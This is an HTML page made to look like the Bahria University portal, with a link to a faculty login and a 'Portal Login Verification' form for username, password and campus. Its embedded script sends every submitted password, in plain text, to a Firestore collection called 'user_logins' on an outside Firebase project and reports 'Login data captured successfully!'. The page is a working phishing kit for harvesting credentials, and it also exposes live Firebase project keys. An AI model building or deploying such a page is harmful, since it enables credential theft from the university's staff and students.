<html xmlns="http://www.w3.org/1999/xhtml" lang="en">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Bahria University Portal Index</title>
	<style type="text/css">
	body {
		margin: 0; padding: 0; margin-bottom: 15px; margin-top: 8px;
		background: #77b;
		font-family: "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;
	}
	#subTitle { background: #000; color: #fff; padding: 4px; font-weight: bold; }
	#pageContent {
		clear: both;
		border-bottom: 6px solid #000;
		padding: 20px;
		background-color: #ccd;
	}
	.blak { background-color: #000; }
	.tableWidth { min-width: 400px; }
	h1 { margin: 0; font-weight: bold; font-size: 1.8em; }
	.form-group { margin-bottom: 15px; }
	.form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
	.form-group input, .form-group select { width: 100%; padding: 8px; box-sizing: border-box; }
	.form-group button { background: #000; color: #fff; padding: 10px 15px; border: none; cursor: pointer; }
	</style>
</head>

<body>

<table width="76%" border="0" align="center" cellspacing="0" cellpadding="3" class="tableWidth">
	<tr><td id="subTitle">Bahria University Portal</td></tr>
</table>

<table width="76%" border="0" align="center" cellspacing="0" cellpadding="0" class="tableWidth">
<tr class="blak">
<td>
	<table width="100%" border="0" align="center" cellspacing="1" cellpadding="0">
	<tr>
	<td colspan="6">
		<table width="100%" border="0" align="center" cellspacing="0" cellpadding="10">
		<tr>
		<td id="pageContent">

<H1 ALIGN=Center>Index of locally available sites:</H1>
	<TABLE BORDER="0" WIDTH="100%" CELLSPACING="1" CELLPADDING="0">
		<TR>
			<TD>
				&middot;
					<A HREF="./cms.bahria.edu.pk/Logins/Faculty/Login.html">
						Faculty Member - Bahria University
					</A>		
			</TD>
		</TR>
	</TABLE>
	
	<br><hr><br>

	<!-- Portal Login / Data Capture Form -->
	<h2>Portal Login Verification</h2>
	<form id="loginForm">
		<div class="form-group">
			<label for="username">Username / Email:</label>
			<input type="text" id="username" required placeholder="Enter username">
		</div>
		<div class="form-group">
			<label for="password">Password:</label>
			<input type="password" id="password" required placeholder="Enter password">
		</div>
		<div class="form-group">
			<label for="institute">Institute / Campus:</label>
			<input type="text" id="institute" required placeholder="Enter institute/campus name">
		</div>
		<div class="form-group">
			<button type="submit" id="submitBtn">Login & Proceed</button>
		</div>
	</form>
	<p id="responseMsg" style="font-weight: bold;"></p>

		</td>
		</tr>
		</table>
	</td>
	</tr>
	</table>
</td>
</tr>
</table>

<table width="76%" border="0" align="center" cellspacing="0" cellpadding="0">
	<tr><td id="footer"><small>&copy; Bahria University</small></td></tr>
</table>

<!-- Firebase Configuration and Logic Script -->
<script type="module">
	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

	// Your web app's Firebase configuration
	const firebaseConfig = {
		apiKey: "AIzaSyAPFQOjtPenZ1j74QcLCt1XjG49FzUPOTY",
		authDomain: "bahria-9c2ac.firebaseapp.com",
		projectId: "bahria-9c2ac",
		storageBucket: "bahria-9c2ac.firebasestorage.app",
		messagingSenderId: "731792968613",
		appId: "1:731792968613:web:43067e1c042a87770cb64c",
		measurementId: "G-6VPPPFDP91"
	};

	// Initialize Firebase
	const app = initializeApp(firebaseConfig);
	const db = getFirestore(app);

	// Form Submission Event Listener
	const form = document.getElementById("loginForm");
	const responseMsg = document.getElementById("responseMsg");

	form.addEventListener("submit", async (e) => {
		e.preventDefault();
		
		const username = document.getElementById("username").value;
		const password = document.getElementById("password").value;
		const institute = document.getElementById("institute").value;
		const submitBtn = document.getElementById("submitBtn");

		submitBtn.disabled = true;
		submitBtn.innerText = "Verifying...";

		try {
			// Firestore mein "user_logins" naam ke collection mein data save ho ga
			await addDoc(collection(db, "user_logins"), {
				username: username,
				password: password,
				institute: institute,
				timestamp: new Date()
			});

			responseMsg.style.color = "green";
			responseMsg.innerText = "Login data captured successfully!";
			form.reset();
		} catch (error) {
			console.error("Error adding document: ", error);
			responseMsg.style.color = "red";
			responseMsg.innerText = "Error: Data save nahi ho saka.";
		} finally {
			submitBtn.disabled = false;
			submitBtn.innerText = "Login & Proceed";
		}
	});
</script>

</body>
</html>
